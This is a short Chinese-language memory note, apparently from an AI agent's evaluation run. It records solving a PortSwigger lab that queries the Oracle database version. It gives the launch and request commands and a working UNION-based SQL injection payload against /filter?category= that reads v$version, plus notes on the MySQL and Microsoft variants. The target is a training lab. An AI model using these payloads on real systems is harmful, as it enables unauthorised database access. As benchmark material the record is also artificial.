---
metadata:
  node_type: memory
name: "PRS arm A querying database version Oracle"
description: "arm A 基线:lab-querying-database-version-oracle 冷实例(reused:false)一次通过 - /filter?category= 两列 UNION SELECT banner,NULL FROM v$version-- 回读 11g 五条 banner,banner solved"
last_updated: 2026-10-09T05:21:46+08:00
created: 2026-10-09T05:21:46+08:00
---

## 2026-10-09 arm A 基线:lab-querying-database-version-oracle

- 起实例:`range_launch launch-url /web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle --jar /tmp/cj1.json` → reused:false,实例 https://0a9e00a00485311280cf089600e5000e.web-security-academy.net/。
- 题面(hint 自带,无需读题解):让数据库返回 `Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL ... 等五条 banner`。
- 一次载荷:`http_session get '<base>/filter?category=Gifts%27%20UNION%20SELECT%20banner%2CNULL%20FROM%20v%24version--' --jar /tmp/cj1.json`。
  - 判型依据:该 lab 的 products 查询两列,Oracle 无 FROM 不成立 ⇒ `UNION SELECT <expr>, NULL FROM v$version--`。
  - 回包 200,商品表 `<th>` 五行即五条 banner(CORE/NLSRTL/Oracle Database 11g/PL-SQL/TNS),hint 字符串逐字命中。
- `banner_verdict <base> --jar /tmp/cj1.json` → solved:true,congrats_line `Congratulations, you solved the lab!`。
- 结论:冷实例一次通过(2 次件调用),无坑。
- 对照记录:mysql/microsoft 变体同题族用 `@@version`;Oracle 必须带 `FROM v$version` 且第二列填 NULL 保列数。

